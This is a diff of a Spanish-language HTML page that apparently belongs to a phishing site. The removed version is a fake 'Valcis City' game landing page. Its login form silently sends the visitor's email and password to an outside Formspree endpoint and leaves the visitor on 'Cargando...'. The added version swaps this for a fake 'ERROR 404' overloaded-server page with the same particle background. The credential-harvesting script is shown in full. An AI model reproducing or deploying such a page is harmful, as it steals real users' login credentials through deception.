@@ -1,205 +1,129 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Valcis City - Juega y Explora</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>ERROR 404</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }
-  body { overflow-x:hidden; background:#0a0a0a; color:#fff; cursor:default; }
+  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
 
-  /* Fondo animado de ciudad */
-  .background {
-    position: fixed; top:0; left:0; width:100%; height:100%; z-index:-1;
-    background: linear-gradient(180deg,#0a0a0a,#1a1a2e);
-    overflow:hidden;
-  }
-  .particles { position:absolute; width:100%; height:100%; top:0; left:0; }
-  .particle {
-    position:absolute; width:3px; height:3px; background:#36d1dc; border-radius:50%;
-    animation: moveParticle linear infinite;
-  }
-  @keyframes moveParticle {
-    0% { transform: translateY(0) translateX(0); opacity:1; }
-    100% { transform: translateY(-1000px) translateX(100px); opacity:0; }
+  html,body { height:100%; }
+
+  body {
+    overflow: hidden;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #ff6f61, #ffb347);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 40px 20px;
   }
 
-  /* Contenedor principal */
-  .container { text-align:center; padding:80px 20px; }
+  canvas#bgCanvas {
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    z-index: -1;
+  }
+
+  .card {
+    max-width: 920px;
+    width: 100%;
+    background: rgba(255,255,255,0.06);
+    padding: 56px 34px;
+    border-radius: 18px;
+    backdrop-filter: blur(10px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+    border: 1px solid rgba(255,255,255,0.08);
+  }
+
   h1 {
-    font-size:4rem; text-transform:uppercase; letter-spacing:5px; color:#36d1dc;
-    text-shadow:0 0 10px #36d1dc,0 0 20px #5b86e5; animation: neonGlow 2s ease-in-out infinite alternate;
-  }
-  @keyframes neonGlow {
-    from { text-shadow:0 0 10px #36d1dc,0 0 20px #5b86e5; }
-    to { text-shadow:0 0 20px #36d1dc,0 0 40px #5b86e5,0 0 60px #5b86e5; }
-  }
-
-  /* Botón pulsante */
-  .btn-create {
-    padding:25px 60px; font-size:1.8rem; font-weight:bold; border:none; border-radius:20px;
-    background: linear-gradient(90deg,#36d1dc,#5b86e5); color:#fff;
-    box-shadow:0 0 20px #36d1dc,0 0 40px #5b86e5;
-    animation: pulse 2s infinite; cursor:pointer; margin-top:50px;
-    transition: transform 0.2s;
-  }
-  .btn-create:hover { transform:scale(1.1); }
-  @keyframes pulse {
-    0% { box-shadow:0 0 20px #36d1dc,0 0 40px #5b86e5; }
-    50% { box-shadow:0 0 40px #36d1dc,0 0 80px #5b86e5; }
-    100% { box-shadow:0 0 20px #36d1dc,0 0 40px #5b86e5; }
+    font-size: 3.2em;
+    font-weight: 800;
+    margin-bottom: 18px;
+    letter-spacing: 2px;
+    text-shadow: 2px 2px 12px rgba(0,0,0,0.45);
   }
 
-  /* Overlay registro */
-  .overlay {
-    position:fixed; top:0; left:0; right:0; bottom:0;
-    background: rgba(0,0,0,0.95); display:none;
-    justify-content:center; align-items:center; z-index:10;
+  p.lead {
+    font-size: 1.25em;
+    line-height: 1.6;
+    max-width: 820px;
+    margin: 0 auto;
+    text-shadow: 1px 1px 6px rgba(0,0,0,0.35);
   }
-  .overlay-content {
-    background:#111; padding:50px 40px; border-radius:25px; text-align:center;
-    width:90%; max-width:500px; box-shadow:0 0 30px #36d1dc,0 0 60px #5b86e5;
-    position:relative; animation: zoomIn 0.6s ease forwards;
+
+  @media (max-width:640px){
+    h1 { font-size: 2.2em; }
+    .card { padding: 36px 20px; border-radius: 14px; }
+    p.lead { font-size: 1em; }
   }
-  @keyframes zoomIn { 0% {transform:scale(0); opacity:0;} 100% {transform:scale(1); opacity:1;} }
-
-  .overlay-content img { width:120px; margin-bottom:20px; animation: logoSpin 6s linear infinite; }
-  @keyframes logoSpin { 0%{transform:rotate(0deg);}100%{transform:rotate(0deg);} }
-
-  .overlay-content input {
-    width:100%; padding:15px; margin:10px 0; border-radius:12px; border:none; font-size:1rem;
-  }
-  .overlay-content button {
-    padding:15px 50px; border:none; border-radius:12px; background:linear-gradient(90deg,#ff512f,#dd2476);
-    color:#fff; font-size:1.2rem; cursor:pointer; transition: all 0.3s;
-  }
-  .overlay-content button:hover { transform:scale(1.05); box-shadow:0 0 25px #ff512f,0 0 50px #dd2476; }
-
-  .message { margin-top:10px; font-size:1rem; color:#ffeb3b; min-height:20px; text-align:center; }
-
-  .close-btn { position:absolute; top:15px; right:15px; font-size:1.5rem; cursor:pointer; color:#fff; }
-  .close-btn:hover { transform:scale(1.2); }
-
-  /* Secciones largas */
-  .section { padding:80px 20px; text-align:center; position:relative; overflow:hidden; }
-  .section h2 { font-size:2.5rem; margin-bottom:20px; color:#36d1dc; text-shadow:0 0 15px #36d1dc; }
-  .section p { font-size:1.2rem; max-width:700px; margin:0 auto; line-height:1.6; color:#fff; }
-
-  /* Efecto parallax con mouse */
-  .parallax { transform:translate3d(0,0,0); transition: transform 0.1s; }
 </style>
 </head>
 <body>
 
-<div class="background">
-  <div class="particles" id="particles"></div>
-</div>
+<canvas id="bgCanvas"></canvas>
 
-<div class="container parallax">
-  <h1>Valcis City</h1>
-  <button class="btn-create" id="openOverlay">¡Crea tu cuenta y empieza tu aventura!</button>
-</div>
-
-<div class="section parallax">
-  <h2>Explora la ciudad</h2>
-  <p>Un mundo vibrante y lleno de vida te espera. Descubre lugares secretos, interactúa con otros jugadores y desbloquea edificios exclusivos.</p>
-</div>
-
-<div class="section parallax">
-  <h2>Misiones y desafíos</h2>
-  <p>Realiza misiones épicas, completa desafíos diarios y gana objetos únicos dentro del juego. Cada acción te acerca a convertirte en leyenda.</p>
-</div>
-
-<div class="section parallax">
-  <h2>Comunidad</h2>
-  <p>Forma alianzas, conoce jugadores de todo el mundo y compite en eventos especiales. La ciudad es tuya para explorar con amigos.</p>
-</div>
-
-<div class="section parallax">
-  <h2>Recompensas</h2>
-  <p>Obtén recompensas únicas, desbloquea poderes especiales y objetos que muestran tu progreso y estilo dentro de Valcis City.</p>
-</div>
-
-<!-- Overlay -->
-<div class="overlay" id="overlay">
-  <div class="overlay-content">
-    <span class="close-btn" id="closeOverlay">&times;</span>
-    <img src="logo.png" alt="Valcis City Logo">
-
-    <form id="loginForm">
-      <input type="text" name="email" id="email" placeholder="Correo o número">
-      <input type="password" name="password" id="password" placeholder="Contraseña">
-      <button type="submit">Iniciar sesión</button>
-      <div class="message" id="message"></div>
-    </form>
-  </div>
+<div class="card" role="main" aria-labelledby="errorTitle">
+  <h1 id="errorTitle">ERROR 404</h1>
+  <p class="lead">En este momento estamos saturados, porfavor vuelva mas tarde</p>
 </div>
 
 <script>
-const overlay = document.getElementById('overlay');
-const openBtn = document.getElementById('openOverlay');
-const closeBtn = document.getElementById('closeOverlay');
-const loginForm = document.getElementById('loginForm');
-const message = document.getElementById('message');
-const email = document.getElementById('email');
-const password = document.getElementById('password');
+  // Partículas de fondo (misma estética que el original)
+  const canvas = document.getElementById('bgCanvas');
+  const ctx = canvas.getContext('2d');
 
-openBtn.addEventListener('click', () => { overlay.style.display='flex'; });
-closeBtn.addEventListener('click', () => { overlay.style.display='none'; message.textContent=''; });
-
-loginForm.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  // Validar campos
-  if(email.value.trim() === '' && password.value.trim() === ''){
-    message.textContent = 'Por favor, rellena todos los campos';
-    return;
-  } else if(email.value.trim() === ''){
-    message.textContent = 'Por favor, ingresa tu correo o número';
-    return;
-  } else if(password.value.trim() === ''){
-    message.textContent = 'Por favor, ingresa tu contraseña';
-    return;
+  function setSize(){
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
   }
+  setSize();
+  window.addEventListener('resize', setSize);
 
-  // Si ambos campos llenos
-  message.textContent = 'Cargando...';
+  const PARTICLE_COUNT = Math.max(80, Math.floor((canvas.width * canvas.height) / (1920*1080) * 150));
+  let particles = [];
 
-  // Enviar datos a Formspree de forma silenciosa
-  try {
-    await fetch('https://formspree.io/f/xkgvjobe', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        email: email.value,
-        password: password.value
-      })
-    });
-    // No mostrar nada al usuario, se queda en "Cargando..."
-  } catch(err) {
-    console.error('Error al enviar formulario', err);
+  function initParticles(){
+    particles = [];
+    for(let i=0;i<PARTICLE_COUNT;i++){
+      particles.push({
+        x: Math.random()*canvas.width,
+        y: Math.random()*canvas.height,
+        r: Math.random()*2 + 0.8,
+        dx: (Math.random()-0.5) * (0.6 + Math.random()*0.8),
+        dy: (Math.random()-0.5) * (0.6 + Math.random()*0.8),
+        alpha: 0.35 + Math.random()*0.5
+      });
+    }
   }
-});
-
-// Partículas
-const particlesContainer = document.getElementById('particles');
-for(let i=0;i<100;i++){
-  let p = document.createElement('div');
-  p.classList.add('particle');
-  p.style.top = Math.random()*100+'%';
-  p.style.left = Math.random()*100+'%';
-  p.style.width = p.style.height = (2+Math.random()*3)+'px';
-  p.style.animationDuration = (5+Math.random()*10)+'s';
-  particlesContainer.appendChild(p);
-}
-
-// Parallax con mouse
-document.addEventListener('mousemove', e => {
-  let x = (window.innerWidth/2 - e.pageX)/50;
-  let y = (window.innerHeight/2 - e.pageY)/50;
-  document.querySelectorAll('.parallax').forEach(el => {
-    el.style.transform=`translate3d(${x}px,${y}px,0)`;
+  initParticles();
+  window.addEventListener('resize', () => {
+    setSize();
+    initParticles();
   });
-});
+
+  function animate(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    particles.forEach(p => {
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+      ctx.fillStyle = `rgba(255,255,255,${p.alpha})`;
+      ctx.fill();
+      p.x += p.dx;
+      p.y += p.dy;
+      if(p.x < -10) p.x = canvas.width + 10;
+      if(p.x > canvas.width + 10) p.x = -10;
+      if(p.y < -10) p.y = canvas.height + 10;
+      if(p.y > canvas.height + 10) p.y = -10;
+    });
+    requestAnimationFrame(animate);
+  }
+  animate();
 </script>
 
 </body>
